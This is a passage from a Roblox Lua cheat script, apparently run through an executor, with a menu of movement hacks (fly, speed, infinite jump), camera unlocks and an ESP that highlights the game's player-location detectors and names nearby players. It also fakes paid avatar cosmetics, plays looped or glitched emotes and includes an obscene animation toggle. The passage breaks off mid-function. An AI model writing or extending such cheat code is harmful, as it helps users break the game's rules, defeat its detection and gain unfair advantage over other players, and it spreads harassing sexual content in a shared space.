        Movement.Jump.Value = v
    end,
})
MovementBox:AddCheckbox('InfiniteJump', {
    Text = 'Infinite Jump',
    Default = false,
    Callback = function(v)
        infiniteJump = v
    end,
})

FlyToggle = MovementBox:AddCheckbox('FlyToggle', {
    Text = 'Fly',
    Default = false,
    Callback = function(v)
        Movement.Fly.Enabled = v

        startFly()
    end,
})
FlyKey = FlyToggle:AddKeyPicker('FlyKeybind', {
    Default = 'None',
    Text = 'Fly Key',
    Mode = 'Toggle',
    Callback = function(state)
        Movement.Fly.Enabled = state

        startFly()
    end,
})

FlyKey:OnChanged(function()
    Movement.Fly.KeybindEnabled = FlyKey.Value
end)
MovementBox:AddSlider('FlySpeedValue', {
    Text = 'Fly Speed',
    Min = 1,
    Max = 1000,
    Default = 120,
    Increment = 1,
    ValueName = 'studs/s',
    Callback = function(v)
        Movement.Fly.Speed = v
    end,
})
RunService.RenderStepped:Connect(function()
    if not sprintEnabled then
        return
    end

    local char = LocalPlayer.Character

    if not char then
        return
    end

    local hum = char:FindFirstChildOfClass('Humanoid')
    local root = char:FindFirstChild('HumanoidRootPart')

    if not hum or not root then
        return
    end

    local dir = hum.MoveDirection

    if dir.Magnitude > 0 then
        root.AssemblyLinearVelocity = Vector3.new(dir.Unit.X * Movement.Speed.Value, root.AssemblyLinearVelocity.Y, dir.Unit.Z * Movement.Speed.Value)
    end
end)
RunService.RenderStepped:Connect(function()
    local char = LocalPlayer.Character

    if not char then
        return
    end

    local hum = char:FindFirstChildOfClass('Humanoid')

    if not hum then
        return
    end

    hum.UseJumpPower = true
    hum.JumpPower = jumpEnabled and Movement.Jump.Value or Movement.Jump.Default
end)
UserInputService.JumpRequest:Connect(function()
    if not infiniteJump then
        return
    end

    local char = LocalPlayer.Character

    if not char then
        return
    end

    local hum = char:FindFirstChildOfClass('Humanoid')

    if hum then
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

local playJerkOffActive = false

jerkOffAnimTrack = nil
jerkOffAnimId = 'rbxassetid://168268306'
speedMultiplier = 1
selectedKey = Enum.KeyCode.Q

function startJerkOff()
    local plr = Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local hum = char:FindFirstChildOfClass('Humanoid')

    if not hum then
        return
    end

    local animator = hum:FindFirstChildOfClass('Animator')

    if not animator then
        animator = Instance.new('Animator')
        animator.Parent = hum
    end

    local anim = Instance.new('Animation')

    anim.AnimationId = jerkOffAnimId
    jerkOffAnimTrack = animator:LoadAnimation(anim)
    jerkOffAnimTrack.Priority = Enum.AnimationPriority.Action

    jerkOffAnimTrack:Play()
    jerkOffAnimTrack:AdjustSpeed(speedMultiplier)
    task.spawn(function()
        while playJerkOffActive do
            task.wait(0.2)

            if jerkOffAnimTrack and jerkOffAnimTrack.IsPlaying then
                jerkOffAnimTrack:AdjustSpeed(speedMultiplier)

                jerkOffAnimTrack.TimePosition = 0.3
            end
        end
    end)
end
function stopJerkOff()
    if jerkOffAnimTrack then
        jerkOffAnimTrack:Stop()

        jerkOffAnimTrack = nil
    end
end

Toggle = MovementBox:AddCheckbox('JerkOffToggle', {
    Text = 'Jerk Off',
    Default = false,
})

Toggle:OnChanged(function(state)
    playJerkOffActive = state

    if state then
        startJerkOff()
    else
        stopJerkOff()
    end
end)

local Keybind = Toggle:AddKeyPicker('JerkOffKeybind', {
    Default = 'Q',
    Text = 'Keybind',
    Mode = 'Toggle',
    Callback = function()
        local newState = not playJerkOffActive

        playJerkOffActive = newState

        Toggle:SetValue(newState)

        if newState then
            startJerkOff()
        else
            stopJerkOff()
        end
    end,
})

Keybind:OnChanged(function()
    selectedKey = Keybind.Value
end)
MovementBox:AddSlider('JerkOffSpeed', {
    Text = 'Speed',
    Default = 1,
    Min = 0.1,
    Max = 5,
    Rounding = 1,
    Callback = function(value)
        speedMultiplier = value

        if jerkOffAnimTrack then
            jerkOffAnimTrack:AdjustSpeed(speedMultiplier)
        end
    end,
})

currentFOV = Camera.FieldOfView

EnvBox:AddCheckbox('ThirdEyeToggle', {
    Text = 'Third Person',
    Tooltip = 'Unlocks camera zoom distance.',
    Default = false,
    Callback = function(v)
        local plr = LocalPlayer

        if v then
            plr.CameraMode = Enum.CameraMode.Classic
            plr.CameraMaxZoomDistance = 1000
            plr.CameraMinZoomDistance = 12

            task.wait()

            plr.CameraMinZoomDistance = 0.5
        else
            plr.CameraMode = Enum.CameraMode.LockFirstPerson
            plr.CameraMaxZoomDistance = 0.5
            plr.CameraMinZoomDistance = 0.5
        end
    end,
})
EnvBox:AddSlider('LensSlider', {
    Text = 'Field of View',
    Tooltip = 'Adjust camera FOV.',
    Default = currentFOV,
    Min = 1,
    Max = 120,
    Rounding = 1,
    Callback = function(v)
        Camera.FieldOfView = v
    end,
})
EnvBox:AddDivider()

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local SoundService = game:GetService('SoundService')
local TextChatService = game:GetService('TextChatService')
local player = Players.LocalPlayer
local soundMap = {
    ['Normal Typing'] = 'rbxassetid://72486459002567',
    ['Thocky Typing'] = 'rbxassetid://76696739955497',
    ['Clean Typing'] = 'rbxassetid://131944804697356',
    ['Clicky Typing'] = 'rbxassetid://9116149587',
}
local currentSoundId = soundMap['Normal Typing']
local typingSound = Instance.new('Sound')

typingSound.SoundId = currentSoundId
typingSound.Looped = true
typingSound.Volume = 1
typingSound.Parent = SoundService

local typing = false

function startSound()
    if typingSound.SoundId and typingSound.SoundId ~= '' then
        if not typingSound.IsPlaying then
            typingSound:Play()
        end
    end
end
function stopSound()
    typingSound:Stop()
end

UserInputService.TextBoxFocused:Connect(function()
    typing = true

    startSound()
end)
UserInputService.TextBoxFocusReleased:Connect(function()
    typing = false

    stopSound()
end)

local enabled = true
local volume = 100

EnvBox:AddCheckbox('TypingSoundToggle', {
    Text = 'Typing Sound',
    Default = true,
})
Toggles.TypingSoundToggle:OnChanged(function(state)
    enabled = state

    if not state then
        stopSound()
    end
end)
EnvBox:AddSlider('TypingVolumeSlider', {
    Text = 'Volume',
    Default = 100,
    Min = 0,
    Max = 100,
    Rounding = 0,
})
Options.TypingVolumeSlider:OnChanged(function(v)
    volume = v
    typingSound.Volume = v / 100
end)
EnvBox:AddDropdown('TypingSoundDropdown', {
    Text = 'Typing Sound',
    Default = 'Normal Typing',
    Values = {
        'Normal Typing',
        'Thocky Typing',
        'Clean Typing',
        'Clicky Typing',
    },
})
Options.TypingSoundDropdown:OnChanged(function(selected)
    local id = soundMap[selected]

    if not id then
        return
    end

    currentSoundId = id

    typingSound:Stop()

    typingSound.SoundId = id
    typingSound.TimePosition = 0
end)

local oldStart = startSound

startSound = function()
    if not enabled then
        return
    end

    oldStart()
end
smoothPCLDs = {}
pcldPlayerCache = {}
espColor = Color3.fromRGB(255, 60, 60)
smoothTime = 0.18

function getPlayerFromPCLD(pcld)
    local closestPlayer
    local closestDist = 10

    for _, player in ipairs(Players:GetPlayers())do
        local char = player.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if hrp then
            local dist = (hrp.Position - pcld.Position).Magnitude

            if dist < closestDist then
                closestDist = dist
                closestPlayer = player
            end
        end
    end

    if closestPlayer then
        pcldPlayerCache[pcld] = {
            player = closestPlayer,
            time = tick(),
        }

        return closestPlayer.DisplayName .. ' (@' .. closestPlayer.Name .. ')'
    end

    local cached = pcldPlayerCache[pcld]

    if cached and tick() - cached.time < 2 then
        local p = cached.player

        return p.DisplayName .. ' (@' .. p.Name .. ')'
    end

    return 'Unknown'
end

DetectorBox:AddLabel('ESP Color'):AddColorPicker('PCLDColor', {
    Default = espColor,
    Title = 'ESP Color',
    Callback = function(v)
        espColor = v

        for _, d in pairs(smoothPCLDs)do
            if d.box then
                d.box.Color = v
            end
            if d.outline then
                d.outline.Color3 = v
            end
        end
    end,
})
DetectorBox:AddSlider('PCLDBoxTrans', {
    Text = 'Box Transparency',
    Default = 50,
    Min = 0,
    Max = 100,
    Rounding = 0,
    Suffix = '%',
    Callback = function(v)
        local t = v / 100

        for _, d in pairs(smoothPCLDs)do
            if d.box then
                d.box.Transparency = t
            end
        end
    end,
})

function createSmoothPCLD(original)
    if smoothPCLDs[original] then
        return
    end

    original.Transparency = 1

    local box = Instance.new('Part')

    box.Name = 'PCLD_Box'
    box.Size = original.Size
    box.CFrame = original.CFrame
    box.Anchored = true
    box.CanCollide = false
    box.CanTouch = false
    box.CanQuery = false
    box.CastShadow = false
    box.Material = Enum.Material.Neon
    box.Color = espColor
    box.Transparency = 0.45
    box.Parent = workspace

    local outline = Instance.new('SelectionBox')

    outline.Adornee = box
    outline.LineThickness = 0.02
    outline.Color3 = espColor
    outline.Transparency = 0.1
    outline.Parent = box

    local data = {
        box = box,
        outline = outline,
        original = original,
        lastUpdate = tick(),
        tween = nil,
    }

    smoothPCLDs[original] = data

    task.spawn(function()
        local lastPos = original.Position

        while box.Parent and original.Parent do
            local pos = original.Position
            local cf = original.CFrame

            if (pos - lastPos).Magnitude > 0.08 then
                lastPos = pos

                if data.tween then
                    data.tween:Cancel()
                end

                data.tween = TweenService:Create(box, TweenInfo.new(smoothTime, Enum.EasingStyle.Linear), {CFrame = cf})

                data.tween:Play()
            end

            task.wait(0.05)
        end
    end)
end
function removeSmoothPCLD(original)
    local d = smoothPCLDs[original]

    if not d then
        return
    end
    if d.tween then
        d.tween:Cancel()
    end
    if d.box then
        d.box:Destroy()
    end

    smoothPCLDs[original] = nil
    pcldPlayerCache[original] = nil
end
function clearAllSmoothPCLDs()
    for _, d in pairs(smoothPCLDs)do
        if d.tween then
            d.tween:Cancel()
        end
        if d.box then
            d.box:Destroy()
        end
    end

    smoothPCLDs = {}
    pcldPlayerCache = {}
end

DetectorBox:AddCheckbox('ViewPCLD', {
    Text = 'PCLD ESP',
    Default = false,
    Callback = function(v)
        if v then
            for _, obj in ipairs(workspace:GetChildren())do
                if obj.Name == 'PlayerCharacterLocationDetector' then
                    createSmoothPCLD(obj)
                end
            end

            cons.viewpcld = workspace.ChildAdded:Connect(function(child)
                if child.Name == 'PlayerCharacterLocationDetector' then
                    task.wait(0.1)
                    createSmoothPCLD(child)
                end
            end)
            cons.pcldRemoved = workspace.ChildRemoved:Connect(function(child)
                if child.Name == 'PlayerCharacterLocationDetector' then
                    removeSmoothPCLD(child)
                end
            end)
        else
            if cons.viewpcld then
                cons.viewpcld:Disconnect()
            end
            if cons.pcldRemoved then
                cons.pcldRemoved:Disconnect()
            end

            clearAllSmoothPCLDs()
        end
    end,
})
Options.PCLDColor:OnChanged(function()
    espColor = Options.PCLDColor.Value

    for _, d in pairs(smoothPCLDs)do
        if d.box then
            d.box.Color = espColor
        end
        if d.outline then
            d.outline.Color3 = espColor
        end
    end
end)

FakeCosmeticsEnabled = false
RespawnPersist = false
CosmeticChoice = 'Both'
KORBLOX_MESH_ID = '101851696'
KORBLOX_TEX_ID = '101851254'
HEADLESS_MESH_ID = '134082579'
HEADLESS_TEX_ID = '134082627'
SavedHeadData = nil

function SnapshotHead()
    local char = LocalPlayer.Character

    if not char then
        return
    end

    local head = char:FindFirstChild('Head')

    if not head then
        return
    end

    SavedHeadData = {
        Transparency = head.Transparency,
        BrickColor = head.BrickColor,
        Material = head.Material,
        Meshes = {},
        Decals = {},
    }

    for _, obj in ipairs(head:GetChildren())do
        if obj:IsA('SpecialMesh') then
            table.insert(SavedHeadData.Meshes, {
                MeshType = obj.MeshType,
                MeshId = obj.MeshId,
                TextureId = obj.TextureId,
                Scale = obj.Scale,
                Offset = obj.Offset,
                VertexColor = obj.VertexColor,
                Name = obj.Name,
            })
        elseif obj:IsA('Decal') then
            table.insert(SavedHeadData.Decals, {
                Texture = obj.Texture,
                Face = obj.Face,
                Transparency = obj.Transparency,
                Name = obj.Name,
            })
        end
    end
end
function WearHeadless()
    local char = LocalPlayer.Character

    if not char then
        return
    end

    local head = char:FindFirstChild('Head')

    if not head then
        return
    end

    SnapshotHead()

    for _, obj in ipairs(head:GetChildren())do
        if obj:IsA('Decal') or obj:IsA('SpecialMesh') then
            obj:Destroy()
        end
    end

    local mesh = Instance.new('SpecialMesh')

    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = 'rbxassetid://' .. HEADLESS_MESH_ID
    mesh.TextureId = 'rbxassetid://' .. HEADLESS_TEX_ID
    mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
    mesh.Name = 'PhantomHeadlessMesh'
    mesh.Parent = head
    head.Transparency = 0.1
    head.BrickColor = BrickColor.new('Really black')
    head.Material = Enum.Material.Plastic
end
function WearKorblox()
    local char = LocalPlayer.Character

    if not char then
        return
    end

    local rleg = char:FindFirstChild('Right Leg') or char:FindFirstChild('RightLowerLeg')

    if not rleg then
        return
    end

    local old = char:FindFirstChild('PhantomKorbloxLeg')

    if old then
        old:Destroy()
    end

    local fakeLeg = Instance.new('Part')

    fakeLeg.Name = 'PhantomKorbloxLeg'
    fakeLeg.Size = rleg.Size
    fakeLeg.CFrame = rleg.CFrame
    fakeLeg.Anchored = false
    fakeLeg.CanCollide = false
    fakeLeg.Transparency = 0
    fakeLeg.BrickColor = BrickColor.new('Really black')
    fakeLeg.Material = Enum.Material.Plastic
    fakeLeg.Parent = char

    local mesh = Instance.new('SpecialMesh')

    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = 'rbxassetid://' .. KORBLOX_MESH_ID
    mesh.TextureId = 'rbxassetid://' .. KORBLOX_TEX_ID
    mesh.Scale = Vector3.new(1, 1, 1)
    mesh.Parent = fakeLeg

    local weld = Instance.new('WeldConstraint')

    weld.Part0 = rleg
    weld.Part1 = fakeLeg
    weld.Parent = rleg
    rleg.Transparency = 1
end
function ApplyCosmetics()
    local char = LocalPlayer.Character

    if not char then
        return
    end
    if CosmeticChoice == 'Headless' then
        WearHeadless()
    elseif CosmeticChoice == 'Korblox' then
        WearKorblox()
    elseif CosmeticChoice == 'Both' then
        WearHeadless()
        WearKorblox()
    end
end
function StripCosmetics()
    local char = LocalPlayer.Character

    if not char then
        return
    end

    local head = char:FindFirstChild('Head')

    if head then
        local m = head:FindFirstChild('PhantomHeadlessMesh')

        if m then
            m:Destroy()
        end
        if SavedHeadData then
            head.Transparency = SavedHeadData.Transparency
            head.BrickColor = SavedHeadData.BrickColor
            head.Material = SavedHeadData.Material

            for _, m2 in ipairs(SavedHeadData.Meshes)do
                local mesh = Instance.new('SpecialMesh')

                mesh.MeshType = m2.MeshType
                mesh.MeshId = m2.MeshId
                mesh.TextureId = m2.TextureId
                mesh.Scale = m2.Scale
                mesh.Offset = m2.Offset
                mesh.VertexColor = m2.VertexColor
                mesh.Name = m2.Name
                mesh.Parent = head
            end
            for _, d in ipairs(SavedHeadData.Decals)do
                local decal = Instance.new('Decal')

                decal.Texture = d.Texture
                decal.Face = d.Face
                decal.Transparency = d.Transparency
                decal.Name = d.Name
                decal.Parent = head
            end

            SavedHeadData = nil
        else
            head.Transparency = 0
        end
    end

    local rleg = char:FindFirstChild('Right Leg') or char:FindFirstChild('RightLowerLeg')

    if rleg then
        rleg.Transparency = 0

        local w = rleg:FindFirstChildOfClass('WeldConstraint')

        if w then
            w:Destroy()
        end
    end

    local fakeleg = char:FindFirstChild('PhantomKorbloxLeg')

    if fakeleg then
        fakeleg:Destroy()
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)

    SavedHeadData = nil

    if FakeCosmeticsEnabled and RespawnPersist then
        ApplyCosmetics()
    end
end)
CosmeticBox:AddCheckbox('CosmeticMasterToggle', {
    Text = 'Enable Cosmetics',
    Default = false,
    Callback = function(v)
        FakeCosmeticsEnabled = v

        if v then
            ApplyCosmetics()
        else
            StripCosmetics()
            Notify('<b>UNSTABLE</b>', 'Cosmetics removed.', 5)
        end
    end,
})

local CosDepBox = CosmeticBox:AddDependencyGroupbox()

CosDepBox:AddDropdown('CosmeticTypeDrop', {
    Text = 'Style',
    Values = {
        'Headless',
        'Korblox',
        'Both',
    },
    Default = 'Both',
    Tooltip = 'Choose which cosmetic to apply.',
    Callback = function(v)
        CosmeticChoice = v

        if FakeCosmeticsEnabled then
            StripCosmetics()
            ApplyCosmetics()
        end

        Notify('<b>UNSTABLE</b>', 'Cosmetic style: ' .. v, 4)
    end,
})
CosDepBox:AddCheckbox('CosmeticRespawnToggle', {
    Text = 'Re-apply on Respawn',
    Default = false,
    Callback = function(v)
        RespawnPersist = v

        Notify('<b>UNSTABLE</b>', 'Respawn persist: ' .. (v and 'On' or 'Off'), 4)
    end,
})
CosDepBox:SetupDependencies({
    {
        Toggles.CosmeticMasterToggle,
        true,
    },
})

character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
humanoid = character:WaitForChild('Humanoid')
animator = humanoid:WaitForChild('Animator')
activeTracks = {}
currentTrack = nil
psychoActive = false
AnimSpeedMultiplier = 1
stopLoopFn = nil
stopDanceLoopFn = nil
AnimPaths = {
    Crouch = ReplicatedFirst:WaitForChild('Animations'):WaitForChild('Crouch'),
    ['Fire Flail'] = ReplicatedFirst:WaitForChild('CatchFire'):WaitForChild('FireFlailAnimation'),
    Flail = ReplicatedFirst:WaitForChild('ThrowPlayers'):WaitForChild('Flail'),
    Type = ReplicatedFirst:WaitForChild('Typing'):WaitForChild('Type'),
}
FTAPAnimList = {}
CurrentFTAPTrack = nil

for name in pairs(AnimPaths)do
    table.insert(FTAPAnimList, name)
end

function stopFTAPTracks()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass('Humanoid')

    if hum then
        local animRef = hum:FindFirstChildOfClass('Animator') or hum

        for _, track in pairs(animRef:GetPlayingAnimationTracks())do
            track:Stop(0.1)
        end
    end
end
function playFTAPAnim()
    if not Toggles.FTAPActiveToggle.Value then
        return
    end

    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass('Humanoid')

    if not hum then
        return
    end

    local animObj = AnimPaths[Options.FTAPPoseDrop.Value]

    if animObj and animObj:IsA('Animation') then
        stopFTAPTracks()

        local animRef = hum:FindFirstChildOfClass('Animator') or Instance.new('Animator', hum)

        CurrentFTAPTrack = animRef:LoadAnimation(animObj)
        CurrentFTAPTrack.Looped = true

        CurrentFTAPTrack:Play(0.1, 1, AnimSpeedMultiplier)
    end
end

FTAPBox:AddDropdown('FTAPPoseDrop', {
    Values = FTAPAnimList,
    Default = FTAPAnimList[1],
    Multi = false,
    Text = 'Pose',
})
FTAPBox:AddCheckbox('FTAPActiveToggle', {
    Text = 'Play Pose',
    Default = false,
})

local FTAPDepBox = FTAPBox:AddDependencyGroupbox()

FTAPDepBox:AddSlider('FTAPRateSlider', {
    Text = 'Speed',
    Default = 1,
    Min = 0.1,
    Max = 5,
    Rounding = 1,
    Suffix = 'x',
})
FTAPDepBox:SetupDependencies({
    {
        Toggles.FTAPActiveToggle,
        true,
    },
})
Options.FTAPRateSlider:OnChanged(function(v)
    AnimSpeedMultiplier = v

    if CurrentFTAPTrack and CurrentFTAPTrack.IsPlaying then
        CurrentFTAPTrack:AdjustSpeed(AnimSpeedMultiplier)
    end
    if currentTrack and currentTrack.IsPlaying then
        currentTrack:AdjustSpeed(AnimSpeedMultiplier)
    end
end)
Options.FTAPPoseDrop:OnChanged(function()
    if Toggles.FTAPActiveToggle.Value then
        playFTAPAnim()
    end
end)
Toggles.FTAPActiveToggle:OnChanged(function(state)
    if state then
        playFTAPAnim()
    else
        stopFTAPTracks()

        if CurrentFTAPTrack then
            CurrentFTAPTrack:Stop()

            CurrentFTAPTrack = nil
        end
    end
end)

emoteList = {
    {
        name = 'Head Throw',
        id = 35154961,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Floating Head',
        id = 121572214,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Crouch',
        id = 182724289,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Floor Crawl',
        id = 282574440,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Dino Walk',
        id = 204328711,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Jumping Jacks',
        id = 429681631,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Loop Head',
        id = 35154961,
        speed = 1,
        weight = 1,
        loopSpeed = 1e6,
    },
    {
        name = 'Hero Jump',
        id = 184574340,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Faint',
        id = 181526230,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Floor Faint',
        id = 181525546,
        speed = 1,
        weight = 1,
        loopSpeed = 2,
    },
    {
        name = 'Super Faint',
        id = 181525546,
        speed = 0.5,
        weight = 1,
        loopSpeed = 40,
    },
    {
        name = 'Levitate',
        id = 313762630,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Float Sit',
        id = 179224234,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Weird Move',
        id = 215384594,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Clone Illusion',
        id = 215384594,
        speed = 1,
        weight = 1,
        loopSpeed = 1e7,
    },
    {
        name = 'Glitch Levitate',
        id = 313762630,
        speed = 1,
        weight = 1,
        loopSpeed = 1e7,
    },
    {
        name = 'Full Punch',
        id = 204062532,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Bow Down',
        id = 204292303,
        speed = 1,
        weight = 1,
        loopSpeed = 3,
    },
    {
        name = 'Sword Slam',
        id = 204295235,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Loop Slam',
        id = 204295235,
        speed = 1,
        weight = 1,
        loopSpeed = 1e4,
    },
    {
        name = 'Mega Insane',
        id = 184574340,
        speed = 0.5,
        weight = 1,
        loopSpeed = 40,
    },
    {
        name = 'Super Punch',
        id = 126753849,
        speed = 1,
        weight = 1,
        loopSpeed = 3,
    },
    {
        name = 'Full Swing',
        id = 218504594,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Arm Turbine',
        id = 259438880,
        speed = 1,
        weight = 1,
        loopSpeed = 1e3,
    },
    {
        name = 'Barrel Roll',
        id = 136801964,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Scared',
        id = 180612465,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Insane',
        id = 33796059,
        speed = 1,
        weight = 1,
        loopSpeed = 1e8,
    },
    {
        name = 'Arm Detach',
        id = 33169583,
        speed = 1,
        weight = 1,
        loopSpeed = 1e6,
    },
    {
        name = 'Sword Slice',
        id = 35978879,
        speed = 1,
        weight = 1,
    },
    {
        name = 'Insane Arms',
        id = 27432691,
        speed = 1,
        weight = 1,
        loopSpeed = 1e4,
    },
}
danceList = {
    {
        name = 'Dab',
        id = 183412246,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Spinner',
        id = 188632011,
        speed = 1,
        weight = 1,
        loopSpeed = 2,
    },
    {
        name = 'Moving Dance',
        id = 429703734,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Spin Dance',
        id = 429730430,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Moon Dance',
        id = 45834924,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Spin Dance 2',
        id = 186934910,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Thriller',
        id = 27789359,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Robot',
        id = 30196114,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Shuffle',
        id = 248263260,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Groove',
        id = 33796059,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Club',
        id = 28488254,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
    {
        name = 'Jump Dance',
        id = 52155728,
        speed = 1,
        weight = 1,
        loopSpeed = 1,
    },
}

function stopAllTracks()
    for _, track in ipairs(activeTracks)do
        pcall(function()
            track:Stop()
            track:Destroy()
        end)
    end

    activeTracks = {}
    currentTrack = nil

    pcall(function()
        typingTrack:Stop()
    end)
    pcall(function()
        crouchTrack:Stop()
    end)
    pcall(function()
        throwedTrack:Stop()
    end)
    pcall(function()
        idleTrack:Stop()
    end)
    pcall(function()
        walkAnimTrack:Stop()
    end)
    pcall(function()
        jumpTrack:Stop()
    end)
    pcall(function()
        fallTrack:Stop()
    end)
    pcall(function()
        newIdleTrack:Stop()
    end)
end
function stopEverything()
    stopLoopFn = nil
    stopDanceLoopFn = nil

    stopAllTracks()
end
function playAnimation(data)
    stopEverything()

    local active = true
    local anim = Instance.new('Animation')

    anim.AnimationId = 'rbxassetid://' .. data.id

    local track = animator:LoadAnimation(anim)

    currentTrack = track

    table.insert(activeTracks, track)

    function playOnce()
        if not active or currentTrack ~= track then
            return
        end
        if not track.IsPlaying then
            track:Play(0.1, data.weight or 1, (data.speed or 1) * AnimSpeedMultiplier)
        end
    end

    if data.loopSpeed then
        track:Play(0.1, data.weight or 1, data.loopSpeed * AnimSpeedMultiplier)
        task.spawn(function()
            while active and currentTrack == track do
                task.wait()
                playOnce()
            end
        end)
    else
        track:Play(0.1, data.weight or 1, (data.speed or 1) * AnimSpeedMultiplier)
    end

    return function()
        active = false

        if currentTrack == track then
            currentTrack = nil
        end

        pcall(function()
            track:Stop()
            track:Destroy()
        end)
    end
end

local emoteNames = {
    'None',
}
local danceNames = {
    'None',
}

for _, d in ipairs(emoteList)do
    table.insert(emoteNames, d.name)
end
for _, d in ipairs(danceList)do
    table.insert(danceNames, d.name)
end

EmoteBox:AddDropdown('EmotePicker', {
    Values = emoteNames,
    Default = 'None',
    Multi = false,
    Text = 'Emote',
})
Options.EmotePicker:OnChanged(function()
    local sel = Options.EmotePicker.Value

    stopEverything()

    if sel == 'None' then
        return
    end

    for _, data in ipairs(emoteList)do
        if data.name == sel then
            stopLoopFn = playAnimation(data)

            return
        end
    end
end)
DanceBox:AddDropdown('DancePicker', {
    Values = danceNames,
    Default = 'None',
    Multi = false,
    Text = 'Dance',
})
Options.DancePicker:OnChanged(function()
    local sel = Options.DancePicker.Value

    stopEverything()

    if sel == 'None' then
        return
    end

    for _, data in ipairs(danceList)do
        if data.name == sel then
            stopDanceLoopFn = playAnimation(data)

            return
        end
    end
end)

typingAnimation = Instance.new('Animation')
typingAnimation.AnimationId = 'rbxassetid://18353618958'
typingTrack = animator:LoadAnimation(typingAnimation)
crouchAnimation = Instance.new('Animation')
crouchAnimation.AnimationId = 'rbxassetid://6980229055'
crouchTrack = animator:LoadAnimation(crouchAnimation)
throwedAnimation = Instance.new('Animation')
throwedAnimation.AnimationId = 'rbxassetid://7047322890'
throwedTrack = animator:LoadAnimation(throwedAnimation)
anim1 = Instance.new('Animation')
anim1.AnimationId = 'rbxassetid://33796059'
animWalk = Instance.new('Animation')
animWalk.AnimationId = 'rbxassetid://95415492'
animJump = Instance.new('Animation')
animJump.AnimationId = 'rbxassetid://165167557'
animFall = Instance.new('Animation')
animFall.AnimationId = 'rbxassetid://97170520'
animNewIdle = Instance.new('Animation')
animNewIdle.AnimationId = 'rbxassetid://15517864808'
idleTrack = humanoid:LoadAnimation(anim1)
walkAnimTrack = humanoid:LoadAnimation(animWalk)
jumpTrack = humanoid:LoadAnimation(animJump)
fallTrack = humanoid:LoadAnimation(animFall)
newIdleTrack = humanoid:LoadAnimation(animNewIdle)

function playIdle()
    task.spawn(function()
        while psychoActive do
            if humanoid.MoveDirection.Magnitude == 0 and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping and humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                idleTrack:Play(0.1, 1, 100 * AnimSpeedMultiplier)
                task.wait(0.2)
                idleTrack:Stop()
                task.wait(1.5)
                newIdleTrack:Play()
                newIdleTrack:AdjustSpeed(5 * AnimSpeedMultiplier)
                task.wait(0.3)
                newIdleTrack:Stop()
                task.wait(1.5)
            else
                task.wait(0.1)
            end
        end
    end)
end
function stopIdle()
    idleTrack:Stop()
    newIdleTrack:Stop()
end

LocalPlayer.CharacterAdded:Connect(function(newChar)
    humanoid = newChar:WaitForChild('Humanoid')
    animator = newChar:WaitForChild('Humanoid'):WaitForChild('Animator')

    stopAllTracks()

    psychoActive = false

    Options.EmotePicker:SetValue('None')
    Options.DancePicker:SetValue('None')
    task.delay(1.5, function()
        if Toggles.FTAPActiveToggle and Toggles.FTAPActiveToggle.Value then
            playFTAPAnim()
        end
    end)
end)

NLeft = Tabs.PlayerTab:AddRightGroupbox('Notifys', 'bell')

workspace.ChildAdded:Connect(function(obj)
    if obj.Name == 'BlackHoleKick' or obj.Name == 'BlackHoleDetected' then
        task.wait(0.1)
        applyEffect(obj)
    end
end)

for _, obj in ipairs(workspace:GetChildren())do
    if obj.Name == 'BlackHoleKick' or obj.Name == 'BlackHoleDetected' then
        applyEffect(obj)
    end
end

Players = game:GetService('Players')
RunService = game:GetService('RunService')
TextChatSvc = game:GetService('TextChatService')
Debris = game:GetService('Debris')
LocalPlayer = Players.LocalPlayer
NS = {
    SoundId = 'rbxassetid://97643101798871',
    Volume = 1,
    Pitch = 1,
    Icon = ICON_ID,
    Enabled = true,
}
_db = {}

function db(key, cd)
    local now = tick()

    if _db[key] and now - _db[key] < (cd or 3) then
        return false
    end

    _db[key] = now

    return true
end
function notify(title, body, duration)
    if not NS.Enabled then
        return
    end

    task.spawn(function()
        local s = Instance.new('Sound')

        s.SoundId = NS.SoundId
        s.Volume = NS.Volume
        s.PlaybackSpeed = NS.Pitch
        s.Parent = workspace

        s:Play()
        Debris:AddItem(s, 4)
    end)
    Library:Notify({
        Title = title,
        Description = body,
        Time = duration or 5,
        Icon = NS.Icon,
    })
end
function rp(ref)
